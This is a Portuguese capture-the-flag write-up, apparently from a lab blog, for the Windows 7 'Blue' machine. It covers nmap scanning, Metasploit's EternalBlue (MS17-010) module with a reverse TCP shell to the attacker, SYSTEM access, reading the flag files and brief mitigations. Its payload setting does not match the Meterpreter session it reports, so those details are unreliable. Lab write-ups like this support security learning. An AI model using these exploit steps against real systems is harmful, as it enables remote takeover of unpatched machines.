---
title: "Blue"
date: 2024-02-20
type: "labs"
difficulty: "Easy"
pwned: true
os: "Windows"
tags: ["windows", "eternalblue", "ms17-010", "smb", "nse"]
summary: "Windows 7 vulnerável ao EternalBlue (MS17-010). Exploit da NSA vaza credenciais e dá SYSTEM em segundos."
machine_info:
  IP: "10.10.10.40"
  OS: "Windows 7 SP1 (x64)"
  Dificuldade: "Easy"
  CVE: "MS17-010 / EternalBlue"
  Porta principal: "445/tcp (SMB)"
---

## Reconhecimento

```bash
$ nmap -sC -sV -oN nmap/blue.txt 10.10.10.40
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Ultimate 7601 SP1
```

Verificando vulnerabilidade MS17-010 diretamente:

```bash
$ nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     Risk factor: HIGH
|     Description:
|       IPC Request exploiting MS17-010 (EternalBlue)
```

## Exploração — EternalBlue

### Via Metasploit

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit > set RHOSTS 10.10.10.40
msf6 exploit > set PAYLOAD windows/x64/shell/reverse_tcp
msf6 exploit > set LHOST tun0
msf6 exploit > run

[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer  : HARIS-PC
OS        : Windows 7 (6.1 Build 7601, Service Pack 1)
```

### Pós-Exploração

```bash
meterpreter > shell
C:\> whoami
nt authority\system

C:\> type C:\Users\haris\Desktop\user.txt
4c546ebb4f771a7b...

C:\> type C:\Users\Administrator\Desktop\root.txt
ff548eb71e920ff6...
```

## Mitigação

- Desabilitar SMBv1 no registro
- Aplicar patch MS17-010 da Microsoft
- Bloquear porta 445 no firewall perimetral

## Flags

```
user.txt  → 4c546ebb4f771a7b...
root.txt  → ff548eb71e920ff6...
```
